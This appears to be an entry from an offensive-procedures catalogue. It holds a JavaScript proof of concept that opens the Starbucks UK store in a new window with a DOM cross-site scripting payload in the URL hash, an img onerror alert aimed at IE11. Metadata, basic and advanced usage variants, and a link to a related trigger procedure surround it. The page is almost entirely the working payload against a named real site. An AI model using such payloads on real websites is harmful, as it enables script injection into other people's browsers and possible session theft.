---
data: |-
  var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>',
    win = window.open(url);
tags:
  - xss
  - poc
  - ie11
type: command
output: New browser window opens to the target URL.
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:47:18.634Z'
id: 9b3bc718-d3d2-4387-a1b3-835d21cba65b
verified: false
validated: true
submitted: true
---
# starbucks-xss-poc-open

## Command

```javascript
var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>',
  win = window.open(url);
```

## Description

Opens the malicious URL in a new browser window (targeting IE11), allowing the initial page load to initialize necessary JavaScript without immediate hash processing.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Malicious URL with hash payload | Yes |
| win | Window reference for further manipulation | No |

## Examples

### Basic Usage

```javascript
var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>',
  win = window.open(url);
```

### Advanced Usage

```javascript
var url = 'https://store.starbucks.co.uk/#<img/src="1"/onerror=alert(1)>',
  win = window.open(url, '_blank', 'width=800,height=600');
```

## Expected Output

A new tab or window loads the Starbucks store page. Verify by inspecting the window object in console.

## Related

- [[Related Procedure|procedures/Trigger-DOM-XSS-via-Hash-Reload-on-IE11]]
